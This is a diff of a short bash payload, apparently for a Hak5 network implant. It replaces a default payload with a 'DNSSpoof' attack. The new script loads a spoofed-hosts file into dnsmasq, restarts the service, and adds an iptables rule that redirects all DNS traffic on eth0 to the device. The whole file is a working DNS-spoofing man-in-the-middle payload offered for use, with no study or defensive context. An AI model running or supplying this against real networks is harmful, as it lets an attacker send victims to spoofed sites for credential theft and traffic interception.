@@ -1,12 +1,29 @@
 #!/bin/bash
-# 
-# Title:	    Default Payload
-# Description:  Sets the NETMODE to NAT, then sets the LED to ATTACK
-# Author: 	    Hak5
-# Version:	    1.0
-# Category:     default
-# Target: 	    Any
-# Net Mode:	    NAT
+# DNSSpoof payload
 
-NETMODE NAT
-LED ATTACK
+
+function setup() {
+	# Show SETUP LED
+	LED SETUP
+
+	# Set the network mode to NAT
+	NETMODE NAT
+	sleep 5
+
+	# Copy the spoofhost file to /tmp/dnsmasq.address
+	cp $(dirname ${BASH_SOURCE[0]})/spoofhost /tmp/dnsmasq.address &> /dev/null
+
+	# Restart dnsmasq with the new configuration
+	/etc/init.d/dnsmasq restart	
+}
+
+function run() {
+	# Show  ATTACK LED
+	LED ATTACK
+
+	# Redirect all DNS traffic to ourselves
+	iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53	
+}
+
+setup
+run
